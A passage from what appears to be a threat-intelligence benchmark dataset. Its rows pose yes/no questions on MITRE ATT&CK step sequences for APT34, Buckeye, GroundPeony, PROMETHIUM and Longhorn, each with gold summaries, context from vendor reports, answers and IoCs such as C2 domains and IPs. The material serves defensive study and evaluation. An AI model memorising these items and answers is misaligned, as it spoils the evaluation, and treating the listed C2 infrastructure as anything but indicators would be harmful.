Command and Control: The SideTwist backdoor communicated with the C&C server (sarmsoftware[.]com) using HTTP on port 443, with port 80 as a fallback. The backdoor used different techniques for outgoing and incoming communications, both encrypted using the Mersenne Twister pseudorandom number generator. Commands were received from the server by searching for specific patterns hidden inside the HTML content of a legitimate-looking website, in this case, a fake Flickr page.
Others: APT34, also known as OilRig, has been actively updating their payload arsenal post-2019 tool leak by Lab Dookhtegan. The group has a history of targeting individuals with job opportunity documents and has continued this method in their latest campaign. The SideTwist backdoor variant is new but provides functionality similar to other C-based backdoors used by APT34, such as DNSpionage and TONEDEAF. The campaign also involved another APT34 tool, a .NET-based backdoor named Karkoff, which used internet-facing exchange servers for communication. The Lebanese Government's exchange server (mail.army.gov[.]lb) credentials were found within the Karkoff implant, suggesting a potential long-term compromise. Check Point Sandblast provides protection against this APT attack.",Yes,Iran’s APT34 Returns with an Updated Arsenal - Check Point Research
1137,243,243-Credential Access-T1056-Input Capture,"After modifying open source hacking tools to evade detection using Backdoor.Pirpi for maintaining presence and collecting information about the network, is Buckeye likely to employ a keylogger for input capture before focusing on file and print servers to steal documents?","Credential Access: Buckeye employs various tools to gather credentials, including a keylogger that records keystrokes and network information, and tools like ChromePass and Lazagne for recovering passwords stored in browsers and other applications.","Initial Access: Buckeye, also known as APT3, Gothic Panda, UPS Team, and TG-0110, has been actively targeting organizations in Hong Kong since June 2015. The group employs spear-phishing emails with malicious .zip attachments containing a Windows shortcut (.lnk) file, which ultimately leads to the download and execution of Backdoor.Pirpi on the victim's computer.
Defense Evasion: Buckeye modifies open source hacking tools to evade detection. They use Backdoor.Pirpi, a remote access Trojan, to maintain a presence on the network and collect information about the target's local network, including domain controllers and workstations.
Collection: Buckeye appears to focus on file and print servers, suggesting an interest in stealing documents. The group's use of zero-day exploits, customized tools, and targeting of specific organizations indicate that they are likely a state-sponsored cyberespionage group.
Others: Symantec has been tracking Buckeye's activities since 2009, with attacks on various organizations. The group has used zero-day vulnerabilities in Internet Explorer and Flash in the past. Symantec and Blue Coat Systems have enhanced protection capabilities against Buckeye's campaigns. Symantec and Norton products detect Backdoor.Pirpi and its variants, and an intrusion prevention system is in place to identify Backdoor.Pirpi activity. Indicators of compromise have been published, including domain/URLs and host-based IoCs with SHA256 hashes.",Yes,Buckeye.cyberespionage.group.shifts.gaze.from.US.to.Hong.Kong.-.Symantec
1138,243,243-Credential Access-T1555-Credentials from Password Stores,Does Buckeye likely execute a spear-phishing campaign with malicious .zip attachments to gain initial access before utilizing customized tools like ChromePass and Lazagne to gather stored credentials for credential access?,"Credential Access: Buckeye employs various tools to gather credentials, including a keylogger that records keystrokes and network information, and tools like ChromePass and Lazagne for recovering passwords stored in browsers and other applications.","Initial Access: Buckeye, also known as APT3, Gothic Panda, UPS Team, and TG-0110, has been actively targeting organizations in Hong Kong since June 2015. The group employs spear-phishing emails with malicious .zip attachments containing a Windows shortcut (.lnk) file, which ultimately leads to the download and execution of Backdoor.Pirpi on the victim's computer.
Defense Evasion: Buckeye modifies open source hacking tools to evade detection. They use Backdoor.Pirpi, a remote access Trojan, to maintain a presence on the network and collect information about the target's local network, including domain controllers and workstations.
Collection: Buckeye appears to focus on file and print servers, suggesting an interest in stealing documents. The group's use of zero-day exploits, customized tools, and targeting of specific organizations indicate that they are likely a state-sponsored cyberespionage group.
Others: Symantec has been tracking Buckeye's activities since 2009, with attacks on various organizations. The group has used zero-day vulnerabilities in Internet Explorer and Flash in the past. Symantec and Blue Coat Systems have enhanced protection capabilities against Buckeye's campaigns. Symantec and Norton products detect Backdoor.Pirpi and its variants, and an intrusion prevention system is in place to identify Backdoor.Pirpi activity. Indicators of compromise have been published, including domain/URLs and host-based IoCs with SHA256 hashes.",Yes,Buckeye.cyberespionage.group.shifts.gaze.from.US.to.Hong.Kong.-.Symantec
1139,243,243-Collection-T1039-Data from Network Shared Drive,"After using a keylogger and tools like ChromePass and Lazagne to gather credentials, is Buckeye likely to focus on file and print servers to collect data from network shared drives?","Collection: Buckeye appears to focus on file and print servers, suggesting an interest in stealing documents. The group's use of zero-day exploits, customized tools, and targeting of specific organizations indicate that they are likely a state-sponsored cyberespionage group.","Initial Access: Buckeye, also known as APT3, Gothic Panda, UPS Team, and TG-0110, has been actively targeting organizations in Hong Kong since June 2015. The group employs spear-phishing emails with malicious .zip attachments containing a Windows shortcut (.lnk) file, which ultimately leads to the download and execution of Backdoor.Pirpi on the victim's computer.
Defense Evasion: Buckeye modifies open source hacking tools to evade detection. They use Backdoor.Pirpi, a remote access Trojan, to maintain a presence on the network and collect information about the target's local network, including domain controllers and workstations.
Credential Access: Buckeye employs various tools to gather credentials, including a keylogger that records keystrokes and network information, and tools like ChromePass and Lazagne for recovering passwords stored in browsers and other applications.
Others: Symantec has been tracking Buckeye's activities since 2009, with attacks on various organizations. The group has used zero-day vulnerabilities in Internet Explorer and Flash in the past. Symantec and Blue Coat Systems have enhanced protection capabilities against Buckeye's campaigns. Symantec and Norton products detect Backdoor.Pirpi and its variants, and an intrusion prevention system is in place to identify Backdoor.Pirpi activity. Indicators of compromise have been published, including domain/URLs and host-based IoCs with SHA256 hashes.",Yes,Buckeye.cyberespionage.group.shifts.gaze.from.US.to.Hong.Kong.-.Symantec
1140,243,243-Collection-T1213-Data from Information Repositories,"After gathering credentials using tools like ChromePass and Lazagne for credential access, is Buckeye likely to focus on file and print servers to steal documents during the collection phase?","Collection: Buckeye appears to focus on file and print servers, suggesting an interest in stealing documents. The group's use of zero-day exploits, customized tools, and targeting of specific organizations indicate that they are likely a state-sponsored cyberespionage group.","Initial Access: Buckeye, also known as APT3, Gothic Panda, UPS Team, and TG-0110, has been actively targeting organizations in Hong Kong since June 2015. The group employs spear-phishing emails with malicious .zip attachments containing a Windows shortcut (.lnk) file, which ultimately leads to the download and execution of Backdoor.Pirpi on the victim's computer.
Defense Evasion: Buckeye modifies open source hacking tools to evade detection. They use Backdoor.Pirpi, a remote access Trojan, to maintain a presence on the network and collect information about the target's local network, including domain controllers and workstations.
Credential Access: Buckeye employs various tools to gather credentials, including a keylogger that records keystrokes and network information, and tools like ChromePass and Lazagne for recovering passwords stored in browsers and other applications.
Others: Symantec has been tracking Buckeye's activities since 2009, with attacks on various organizations. The group has used zero-day vulnerabilities in Internet Explorer and Flash in the past. Symantec and Blue Coat Systems have enhanced protection capabilities against Buckeye's campaigns. Symantec and Norton products detect Backdoor.Pirpi and its variants, and an intrusion prevention system is in place to identify Backdoor.Pirpi activity. Indicators of compromise have been published, including domain/URLs and host-based IoCs with SHA256 hashes.",Yes,Buckeye.cyberespionage.group.shifts.gaze.from.US.to.Hong.Kong.-.Symantec
1143,244,244-Execution-T1059-Command and Scripting Interpreter,"After exploiting the Follina vulnerability (CVE-2022-30190) to distribute malware and establish initial access, is it likely that the GroundPeony campaign will rename ""Install.exe"" to ""mic.exe"" for further execution before utilizing DLL side-loading with ""version.dll"" to evade defenses?","Execution: The GroundPeony campaign utilized a malicious executable named "".exe"" or ""Install.exe"" which was copied and renamed to ""mic.exe"" for DLL side-loading. The side-loaded DLL, ""version.dll"", functioned as a shellcode launcher for ""mic.doc"", which is a shellcode downloader known as micDown. The ""mic.ver"" file served as a config file for ""mic.doc"". The attack flow involved executing the renamed executable, loading and decrypting the associated files, and communicating with the C&C server.","Initial Access: The GroundPeony threat group, also known as UNC3347, has been actively targeting East and South Asian countries since at least 2021. They have been observed exploiting a zero-day vulnerability, Follina (CVE-2022-30190), and compromising target-related websites to distribute malware. The group's recent campaign involved spear-phishing emails with lure documents and URL obfuscation to download and execute malicious payloads from compromised websites, ultimately establishing communication with a C&C server.
Defense Evasion: The GroundPeony campaign exhibited defense evasion techniques through the use of DLL side-loading, specifically with the ""version.dll"" file. This file was used to decode and launch shellcode from ""mic.doc"". The decoding process was a two-step procedure involving custom XOR operations. Additionally, the ""mic.doc"" payload had its MZ header removed and was responsible for downloading encoded shellcode, which it would then decode using a similar custom XOR algorithm.
Command and Control: The GroundPeony campaign established command and control (C&C) communication through the use of a C&C server, identified by the domain ""app.onedrivo.com"" with the IP address 172.93.189.239. The ""mic.ver"" config file contained encoded information for connecting to the C&C server, including the IP address and port, which was decoded to facilitate communication.
Others: The GroundPeony threat group, also known as UNC3347, is a China-nexus threat group active since at least 2021, targeting government, research, educational institutes, and telecom sectors in Taiwan, Hong Kong, South Korea, Nepal, and India. The group has been linked to past campaigns exploiting the Follina vulnerability (CVE-2022-30190) and has used infrastructure associated with PublicDomainRegistry, AS63734 (365 Online technology joint stock company), AS55720 (Gigabit Hosting Sdn Bhd), and AS 30823 (combahton GmbH). Indicators of Compromise (IoCs) include various SHA256 hashes and IP addresses/domains such as 103.199.17.184, 160.20.145.111, and *.onedrivo.com.",Yes,GroundPeony_Crawling_with_Malice
1144,244,244-Execution-T1129-Shared Modules,"After GroundPeony gains initial access by exploiting the Follina vulnerability and distributing malware via compromised websites, is it likely that they will proceed to execute the renamed malicious executable for DLL side-loading before performing defense evasion by decoding and launching shellcode from ""mic.doc"" using the ""version.dll"" file?","Execution: The GroundPeony campaign utilized a malicious executable named "".exe"" or ""Install.exe"" which was copied and renamed to ""mic.exe"" for DLL side-loading. The side-loaded DLL, ""version.dll"", functioned as a shellcode launcher for ""mic.doc"", which is a shellcode downloader known as micDown. The ""mic.ver"" file served as a config file for ""mic.doc"". The attack flow involved executing the renamed executable, loading and decrypting the associated files, and communicating with the C&C server.","Initial Access: The GroundPeony threat group, also known as UNC3347, has been actively targeting East and South Asian countries since at least 2021. They have been observed exploiting a zero-day vulnerability, Follina (CVE-2022-30190), and compromising target-related websites to distribute malware. The group's recent campaign involved spear-phishing emails with lure documents and URL obfuscation to download and execute malicious payloads from compromised websites, ultimately establishing communication with a C&C server.
Defense Evasion: The GroundPeony campaign exhibited defense evasion techniques through the use of DLL side-loading, specifically with the ""version.dll"" file. This file was used to decode and launch shellcode from ""mic.doc"". The decoding process was a two-step procedure involving custom XOR operations. Additionally, the ""mic.doc"" payload had its MZ header removed and was responsible for downloading encoded shellcode, which it would then decode using a similar custom XOR algorithm.
Command and Control: The GroundPeony campaign established command and control (C&C) communication through the use of a C&C server, identified by the domain ""app.onedrivo.com"" with the IP address 172.93.189.239. The ""mic.ver"" config file contained encoded information for connecting to the C&C server, including the IP address and port, which was decoded to facilitate communication.
Others: The GroundPeony threat group, also known as UNC3347, is a China-nexus threat group active since at least 2021, targeting government, research, educational institutes, and telecom sectors in Taiwan, Hong Kong, South Korea, Nepal, and India. The group has been linked to past campaigns exploiting the Follina vulnerability (CVE-2022-30190) and has used infrastructure associated with PublicDomainRegistry, AS63734 (365 Online technology joint stock company), AS55720 (Gigabit Hosting Sdn Bhd), and AS 30823 (combahton GmbH). Indicators of Compromise (IoCs) include various SHA256 hashes and IP addresses/domains such as 103.199.17.184, 160.20.145.111, and *.onedrivo.com.",Yes,GroundPeony_Crawling_with_Malice
1145,244,244-Defense Evasion-T1027-Obfuscated Files or Information,"After using a zero-day vulnerability (CVE-2022-30190) and compromised websites for initial access, is it likely that the GroundPeony campaign will execute renamed executables such as ""mic.exe"" for DLL side-loading before employing version.dll and mic.doc as obfuscation techniques to evade defenses?","Defense Evasion: The GroundPeony campaign exhibited defense evasion techniques through the use of DLL side-loading, specifically with the ""version.dll"" file. This file was used to decode and launch shellcode from ""mic.doc"". The decoding process was a two-step procedure involving custom XOR operations. Additionally, the ""mic.doc"" payload had its MZ header removed and was responsible for downloading encoded shellcode, which it would then decode using a similar custom XOR algorithm.","Initial Access: The GroundPeony threat group, also known as UNC3347, has been actively targeting East and South Asian countries since at least 2021. They have been observed exploiting a zero-day vulnerability, Follina (CVE-2022-30190), and compromising target-related websites to distribute malware. The group's recent campaign involved spear-phishing emails with lure documents and URL obfuscation to download and execute malicious payloads from compromised websites, ultimately establishing communication with a C&C server.
Execution: The GroundPeony campaign utilized a malicious executable named "".exe"" or ""Install.exe"" which was copied and renamed to ""mic.exe"" for DLL side-loading. The side-loaded DLL, ""version.dll"", functioned as a shellcode launcher for ""mic.doc"", which is a shellcode downloader known as micDown. The ""mic.ver"" file served as a config file for ""mic.doc"". The attack flow involved executing the renamed executable, loading and decrypting the associated files, and communicating with the C&C server.
Command and Control: The GroundPeony campaign established command and control (C&C) communication through the use of a C&C server, identified by the domain ""app.onedrivo.com"" with the IP address 172.93.189.239. The ""mic.ver"" config file contained encoded information for connecting to the C&C server, including the IP address and port, which was decoded to facilitate communication.
Others: The GroundPeony threat group, also known as UNC3347, is a China-nexus threat group active since at least 2021, targeting government, research, educational institutes, and telecom sectors in Taiwan, Hong Kong, South Korea, Nepal, and India. The group has been linked to past campaigns exploiting the Follina vulnerability (CVE-2022-30190) and has used infrastructure associated with PublicDomainRegistry, AS63734 (365 Online technology joint stock company), AS55720 (Gigabit Hosting Sdn Bhd), and AS 30823 (combahton GmbH). Indicators of Compromise (IoCs) include various SHA256 hashes and IP addresses/domains such as 103.199.17.184, 160.20.145.111, and *.onedrivo.com.",Yes,GroundPeony_Crawling_with_Malice
1146,244,244-Command and Control-T1071-Application Layer Protocol,"After employing defense evasion by using DLL side-loading with ""version.dll"" to decode and launch shellcode from ""mic.doc"", is the GroundPeony campaign likely to establish command and control (C&C) communication through a server identified as ""app.onedrivo.com"" to facilitate communication?","Command and Control: The GroundPeony campaign established command and control (C&C) communication through the use of a C&C server, identified by the domain ""app.onedrivo.com"" with the IP address 172.93.189.239. The ""mic.ver"" config file contained encoded information for connecting to the C&C server, including the IP address and port, which was decoded to facilitate communication.","Initial Access: The GroundPeony threat group, also known as UNC3347, has been actively targeting East and South Asian countries since at least 2021. They have been observed exploiting a zero-day vulnerability, Follina (CVE-2022-30190), and compromising target-related websites to distribute malware. The group's recent campaign involved spear-phishing emails with lure documents and URL obfuscation to download and execute malicious payloads from compromised websites, ultimately establishing communication with a C&C server.
Execution: The GroundPeony campaign utilized a malicious executable named "".exe"" or ""Install.exe"" which was copied and renamed to ""mic.exe"" for DLL side-loading. The side-loaded DLL, ""version.dll"", functioned as a shellcode launcher for ""mic.doc"", which is a shellcode downloader known as micDown. The ""mic.ver"" file served as a config file for ""mic.doc"". The attack flow involved executing the renamed executable, loading and decrypting the associated files, and communicating with the C&C server.
Defense Evasion: The GroundPeony campaign exhibited defense evasion techniques through the use of DLL side-loading, specifically with the ""version.dll"" file. This file was used to decode and launch shellcode from ""mic.doc"". The decoding process was a two-step procedure involving custom XOR operations. Additionally, the ""mic.doc"" payload had its MZ header removed and was responsible for downloading encoded shellcode, which it would then decode using a similar custom XOR algorithm.
Others: The GroundPeony threat group, also known as UNC3347, is a China-nexus threat group active since at least 2021, targeting government, research, educational institutes, and telecom sectors in Taiwan, Hong Kong, South Korea, Nepal, and India. The group has been linked to past campaigns exploiting the Follina vulnerability (CVE-2022-30190) and has used infrastructure associated with PublicDomainRegistry, AS63734 (365 Online technology joint stock company), AS55720 (Gigabit Hosting Sdn Bhd), and AS 30823 (combahton GmbH). Indicators of Compromise (IoCs) include various SHA256 hashes and IP addresses/domains such as 103.199.17.184, 160.20.145.111, and *.onedrivo.com.",Yes,GroundPeony_Crawling_with_Malice
1148,244,244-Command and Control-T1132-Data Encoding,"After utilizing DLL side-loading for defense evasion by decoding and launching shellcode from the ""version.dll"" file, is the GroundPeony campaign likely to decode configuration information to establish command and control (C&C) communication through the ""app.onedrivo.com"" domain?","Command and Control: The GroundPeony campaign established command and control (C&C) communication through the use of a C&C server, identified by the domain ""app.onedrivo.com"" with the IP address 172.93.189.239. The ""mic.ver"" config file contained encoded information for connecting to the C&C server, including the IP address and port, which was decoded to facilitate communication.","Initial Access: The GroundPeony threat group, also known as UNC3347, has been actively targeting East and South Asian countries since at least 2021. They have been observed exploiting a zero-day vulnerability, Follina (CVE-2022-30190), and compromising target-related websites to distribute malware. The group's recent campaign involved spear-phishing emails with lure documents and URL obfuscation to download and execute malicious payloads from compromised websites, ultimately establishing communication with a C&C server.
Execution: The GroundPeony campaign utilized a malicious executable named "".exe"" or ""Install.exe"" which was copied and renamed to ""mic.exe"" for DLL side-loading. The side-loaded DLL, ""version.dll"", functioned as a shellcode launcher for ""mic.doc"", which is a shellcode downloader known as micDown. The ""mic.ver"" file served as a config file for ""mic.doc"". The attack flow involved executing the renamed executable, loading and decrypting the associated files, and communicating with the C&C server.
Defense Evasion: The GroundPeony campaign exhibited defense evasion techniques through the use of DLL side-loading, specifically with the ""version.dll"" file. This file was used to decode and launch shellcode from ""mic.doc"". The decoding process was a two-step procedure involving custom XOR operations. Additionally, the ""mic.doc"" payload had its MZ header removed and was responsible for downloading encoded shellcode, which it would then decode using a similar custom XOR algorithm.
Others: The GroundPeony threat group, also known as UNC3347, is a China-nexus threat group active since at least 2021, targeting government, research, educational institutes, and telecom sectors in Taiwan, Hong Kong, South Korea, Nepal, and India. The group has been linked to past campaigns exploiting the Follina vulnerability (CVE-2022-30190) and has used infrastructure associated with PublicDomainRegistry, AS63734 (365 Online technology joint stock company), AS55720 (Gigabit Hosting Sdn Bhd), and AS 30823 (combahton GmbH). Indicators of Compromise (IoCs) include various SHA256 hashes and IP addresses/domains such as 103.199.17.184, 160.20.145.111, and *.onedrivo.com.",Yes,GroundPeony_Crawling_with_Malice
1157,245,245-Collection-T1005-Data from Local System,"After evading detection by adding malware directories to the Windows Defender exclusions list using PowerShell commands, is it likely that PROMETHIUM will search for and exfiltrate Microsoft Office files and use a document search module to parse the hard drive for files with specific extensions during its collection phase?","Collection: The malware searches for and exfiltrates Microsoft Office files found on the system. It uses a document search module to parse the hard drive for files with specific extensions, compresses them into an archive, and encodes the archive before sending it to the C2 server.","Initial Access: The PROMETHIUM threat actor, active since 2012, has been using trojanized installation files of well-known applications such as Firefox, VPNpro, DriverPack, and 5kPlayer to gain initial access to victims' systems. These trojanized files install both the malware and the legitimate application, which helps to disguise the malicious activities. The group has targeted victims in Colombia, India, Canada, and Vietnam.
Execution: The execution of the PROMETHIUM malware involves the use of trojanized installers that deploy the malware alongside legitimate applications. The malware uses a service for persistence and executes a PowerShell command to reconfigure Windows Defender, adding exclusions for the malware's directories and preventing sample submission. The service executable's sole purpose is to launch the C2 contact module upon service startup.
Persistence: PROMETHIUM achieves persistence by creating a service that launches the C2 contact module upon service startup. The service name changes from package to package, and the dropped files are stored in a specific Temp folder pattern.
Defense Evasion: To evade detection, the PROMETHIUM malware performs checks for ESET or BitDefender antivirus before dropping the malware. If these antiviruses are installed, the malware will not be dropped. Additionally, the malware adds its directories to the Windows Defender exclusions list using a PowerShell command.
Command and Control: PROMETHIUM's C2 infrastructure includes around 30 new C2 domains identified by Cisco Talos. The domains are hardcoded into the malware, suggesting the use of a Builder tool to generate the binaries. The C2 servers communicate over HTTPS using self-signed certificates.
Exfiltration: The malware exfiltrates encoded archives containing documents to the C2 server. The archives are encoded using an unusual scheme and split into chunks if larger than a certain size before being sent.
Others: PROMETHIUM has been resilient over the years, continuing its activities despite being exposed multiple times. The group's campaigns have been clustered based on domain creation dates, with some campaigns overlapping and going back to 2018. The threat actor's focus has expanded from Europe and the Middle East to a global operation targeting organizations on most continents. The characteristics of the malware suggest that PROMETHIUM could be part of an enterprise service for hire operation. Cisco Talos provides various ways for customers to detect and block this threat, including Advanced Malware Protection (AMP), Cisco Cloud Web Security (CWS), Email Security, Network Security appliances, AMP Threat Grid, Umbrella, and Snort Subscriber Rule Set.",Yes,Talos Blog __ Cisco Talos Intelligence Group - Comprehensive Threat Intelligence_ PROMETHIUM extends global reach with StrongPity3 APT
1158,245,245-Collection-T1560-Archive Collected Data,"After the PROMETHIUM malware identifies and exfiltrates files by using a document search module, compressing and encoding them into an archive, is it likely to follow up by sending the encoded archive to the C2 server over HTTPS with hardened infrastructure supported by self-signed certificates?","Collection: The malware searches for and exfiltrates Microsoft Office files found on the system. It uses a document search module to parse the hard drive for files with specific extensions, compresses them into an archive, and encodes the archive before sending it to the C2 server.","Initial Access: The PROMETHIUM threat actor, active since 2012, has been using trojanized installation files of well-known applications such as Firefox, VPNpro, DriverPack, and 5kPlayer to gain initial access to victims' systems. These trojanized files install both the malware and the legitimate application, which helps to disguise the malicious activities. The group has targeted victims in Colombia, India, Canada, and Vietnam.
Execution: The execution of the PROMETHIUM malware involves the use of trojanized installers that deploy the malware alongside legitimate applications. The malware uses a service for persistence and executes a PowerShell command to reconfigure Windows Defender, adding exclusions for the malware's directories and preventing sample submission. The service executable's sole purpose is to launch the C2 contact module upon service startup.
Persistence: PROMETHIUM achieves persistence by creating a service that launches the C2 contact module upon service startup. The service name changes from package to package, and the dropped files are stored in a specific Temp folder pattern.
Defense Evasion: To evade detection, the PROMETHIUM malware performs checks for ESET or BitDefender antivirus before dropping the malware. If these antiviruses are installed, the malware will not be dropped. Additionally, the malware adds its directories to the Windows Defender exclusions list using a PowerShell command.
Command and Control: PROMETHIUM's C2 infrastructure includes around 30 new C2 domains identified by Cisco Talos. The domains are hardcoded into the malware, suggesting the use of a Builder tool to generate the binaries. The C2 servers communicate over HTTPS using self-signed certificates.
Exfiltration: The malware exfiltrates encoded archives containing documents to the C2 server. The archives are encoded using an unusual scheme and split into chunks if larger than a certain size before being sent.
Others: PROMETHIUM has been resilient over the years, continuing its activities despite being exposed multiple times. The group's campaigns have been clustered based on domain creation dates, with some campaigns overlapping and going back to 2018. The threat actor's focus has expanded from Europe and the Middle East to a global operation targeting organizations on most continents. The characteristics of the malware suggest that PROMETHIUM could be part of an enterprise service for hire operation. Cisco Talos provides various ways for customers to detect and block this threat, including Advanced Malware Protection (AMP), Cisco Cloud Web Security (CWS), Email Security, Network Security appliances, AMP Threat Grid, Umbrella, and Snort Subscriber Rule Set.",Yes,Talos Blog __ Cisco Talos Intelligence Group - Comprehensive Threat Intelligence_ PROMETHIUM extends global reach with StrongPity3 APT
1159,245,245-Exfiltration-T1041-Exfiltration Over C2 Channel,"After PROMETHIUM searches for and compresses Microsoft Office files into archives using a document search module during the Collection phase, is it likely that the malware will encode the archives with an unusual scheme and split them into chunks before exfiltrating them to the C2 server during the Exfiltration phase?",Exfiltration: The malware exfiltrates encoded archives containing documents to the C2 server. The archives are encoded using an unusual scheme and split into chunks if larger than a certain size before being sent.,"Initial Access: The PROMETHIUM threat actor, active since 2012, has been using trojanized installation files of well-known applications such as Firefox, VPNpro, DriverPack, and 5kPlayer to gain initial access to victims' systems. These trojanized files install both the malware and the legitimate application, which helps to disguise the malicious activities. The group has targeted victims in Colombia, India, Canada, and Vietnam.
Execution: The execution of the PROMETHIUM malware involves the use of trojanized installers that deploy the malware alongside legitimate applications. The malware uses a service for persistence and executes a PowerShell command to reconfigure Windows Defender, adding exclusions for the malware's directories and preventing sample submission. The service executable's sole purpose is to launch the C2 contact module upon service startup.
Persistence: PROMETHIUM achieves persistence by creating a service that launches the C2 contact module upon service startup. The service name changes from package to package, and the dropped files are stored in a specific Temp folder pattern.
Defense Evasion: To evade detection, the PROMETHIUM malware performs checks for ESET or BitDefender antivirus before dropping the malware. If these antiviruses are installed, the malware will not be dropped. Additionally, the malware adds its directories to the Windows Defender exclusions list using a PowerShell command.
Collection: The malware searches for and exfiltrates Microsoft Office files found on the system. It uses a document search module to parse the hard drive for files with specific extensions, compresses them into an archive, and encodes the archive before sending it to the C2 server.
Command and Control: PROMETHIUM's C2 infrastructure includes around 30 new C2 domains identified by Cisco Talos. The domains are hardcoded into the malware, suggesting the use of a Builder tool to generate the binaries. The C2 servers communicate over HTTPS using self-signed certificates.
Others: PROMETHIUM has been resilient over the years, continuing its activities despite being exposed multiple times. The group's campaigns have been clustered based on domain creation dates, with some campaigns overlapping and going back to 2018. The threat actor's focus has expanded from Europe and the Middle East to a global operation targeting organizations on most continents. The characteristics of the malware suggest that PROMETHIUM could be part of an enterprise service for hire operation. Cisco Talos provides various ways for customers to detect and block this threat, including Advanced Malware Protection (AMP), Cisco Cloud Web Security (CWS), Email Security, Network Security appliances, AMP Threat Grid, Umbrella, and Snort Subscriber Rule Set.",Yes,Talos Blog __ Cisco Talos Intelligence Group - Comprehensive Threat Intelligence_ PROMETHIUM extends global reach with StrongPity3 APT
1166,247,247-Defense Evasion-T1070-Indicator Removal,"After Longhorn gains initial access by exploiting a zero-day vulnerability embedded in a Word document to infect a target with Plexor malware, is it likely that their tools will follow guidelines on tactics to avoid detection as outlined in the Vault 7 documents before performing detailed system fingerprinting for discovery?","Defense Evasion: Longhorn's tools follow the guidelines on tactics to avoid detection as outlined in the Vault 7 documents. They employ practices such as wipe-on-use, in-memory string de-obfuscation, using a unique deployment-time key for string obfuscation, and secure erase protocols involving renaming and overwriting. Longhorn's malware communicates externally at select times, with upload limits on exfiltrated data, and randomization of communication intervals to stay under the radar.","Initial Access: The Longhorn group has been active since at least 2011, utilizing back door Trojans and zero-day vulnerabilities to compromise targets. On one occasion, a computer in the United States was compromised but an uninstaller was launched within hours, indicating an unintentional infection. Longhorn's operations were first noticed by Symantec in 2014 when a zero-day exploit (CVE-2014-4148) embedded in a Word document was used to infect a target with Plexor malware.
Discovery: Longhorn's malware is built for espionage with detailed system fingerprinting, discovery, and exfiltration capabilities. It uses operational security measures to remain undetected.
Collection: Longhorn's malware has an extensive list of commands for remote control and can be customized with additional plugins and modules. It is designed for espionage-type operations with capabilities for detailed system fingerprinting, discovery, and exfiltration.
Command and Control: Longhorn configures a specific domain and IP address combination per target for C&C servers, using privacy services to hide their real identity. The IP addresses are typically owned by legitimate companies offering VPS or web hosting services. The malware communicates with C&C servers over HTTPS using a custom cryptographic protocol to protect communications from identification.
Exfiltration: Longhorn's malware communicates externally at select times, with upload limits on exfiltrated data, and randomization of communication intervals to avoid detection.
Others: Symantec has been protecting its customers from Longhorn's tools for the past three years and has continued to track the group. Longhorn has infiltrated governments and internationally operating organizations, as well as targets in various sectors. Symantec has found evidence of Longhorn activities against 40 targets in 16 countries. The group uses preconfigured malware with target-specific code words and distinct C&C domains and IP addresses. Longhorn operates with a high degree of operational security and appears to work a standard Monday to Friday working week, with indicators suggesting it is from an English-speaking, North American country.",Yes,Longhorn_ Tools used by cyberespionage group linked to Vault 7
1168,247,247-Discovery-T1082-System Information Discovery,"After employing tactics like wipe-on-use and in-memory string de-obfuscation for defense evasion, is Longhorn likely to use its malware built for espionage to perform system information discovery as part of its discovery operations before engaging in detailed system fingerprinting and exfiltration during the collection phase?","Discovery: Longhorn's malware is built for espionage with detailed system fingerprinting, discovery, and exfiltration capabilities. It uses operational security measures to remain undetected.","Initial Access: The Longhorn group has been active since at least 2011, utilizing back door Trojans and zero-day vulnerabilities to compromise targets. On one occasion, a computer in the United States was compromised but an uninstaller was launched within hours, indicating an unintentional infection. Longhorn's operations were first noticed by Symantec in 2014 when a zero-day exploit (CVE-2014-4148) embedded in a Word document was used to infect a target with Plexor malware.
Defense Evasion: Longhorn's tools follow the guidelines on tactics to avoid detection as outlined in the Vault 7 documents. They employ practices such as wipe-on-use, in-memory string de-obfuscation, using a unique deployment-time key for string obfuscation, and secure erase protocols involving renaming and overwriting. Longhorn's malware communicates externally at select times, with upload limits on exfiltrated data, and randomization of communication intervals to stay under the radar.
Collection: Longhorn's malware has an extensive list of commands for remote control and can be customized with additional plugins and modules. It is designed for espionage-type operations with capabilities for detailed system fingerprinting, discovery, and exfiltration.
Command and Control: Longhorn configures a specific domain and IP address combination per target for C&C servers, using privacy services to hide their real identity. The IP addresses are typically owned by legitimate companies offering VPS or web hosting services. The malware communicates with C&C servers over HTTPS using a custom cryptographic protocol to protect communications from identification.
Exfiltration: Longhorn's malware communicates externally at select times, with upload limits on exfiltrated data, and randomization of communication intervals to avoid detection.
Others: Symantec has been protecting its customers from Longhorn's tools for the past three years and has continued to track the group. Longhorn has infiltrated governments and internationally operating organizations, as well as targets in various sectors. Symantec has found evidence of Longhorn activities against 40 targets in 16 countries. The group uses preconfigured malware with target-specific code words and distinct C&C domains and IP addresses. Longhorn operates with a high degree of operational security and appears to work a standard Monday to Friday working week, with indicators suggesting it is from an English-speaking, North American country.",Yes,Longhorn_ Tools used by cyberespionage group linked to Vault 7
1169,247,247-Exfiltration-T1029-Scheduled Transfer,"After configuring a specific domain and IP address combination per target for C&C communication over HTTPS using a custom cryptographic protocol, is it likely that Longhorn's malware will communicate externally for scheduled exfiltration to avoid detection through upload limits and randomized intervals?","Exfiltration: Longhorn's malware communicates externally at select times, with upload limits on exfiltrated data, and randomization of communication intervals to avoid detection.","Initial Access: The Longhorn group has been active since at least 2011, utilizing back door Trojans and zero-day vulnerabilities to compromise targets. On one occasion, a computer in the United States was compromised but an uninstaller was launched within hours, indicating an unintentional infection. Longhorn's operations were first noticed by Symantec in 2014 when a zero-day exploit (CVE-2014-4148) embedded in a Word document was used to infect a target with Plexor malware.
Defense Evasion: Longhorn's tools follow the guidelines on tactics to avoid detection as outlined in the Vault 7 documents. They employ practices such as wipe-on-use, in-memory string de-obfuscation, using a unique deployment-time key for string obfuscation, and secure erase protocols involving renaming and overwriting. Longhorn's malware communicates externally at select times, with upload limits on exfiltrated data, and randomization of communication intervals to stay under the radar.
Discovery: Longhorn's malware is built for espionage with detailed system fingerprinting, discovery, and exfiltration capabilities. It uses operational security measures to remain undetected.
Collection: Longhorn's malware has an extensive list of commands for remote control and can be customized with additional plugins and modules. It is designed for espionage-type operations with capabilities for detailed system fingerprinting, discovery, and exfiltration.
Command and Control: Longhorn configures a specific domain and IP address combination per target for C&C servers, using privacy services to hide their real identity. The IP addresses are typically owned by legitimate companies offering VPS or web hosting services. The malware communicates with C&C servers over HTTPS using a custom cryptographic protocol to protect communications from identification.
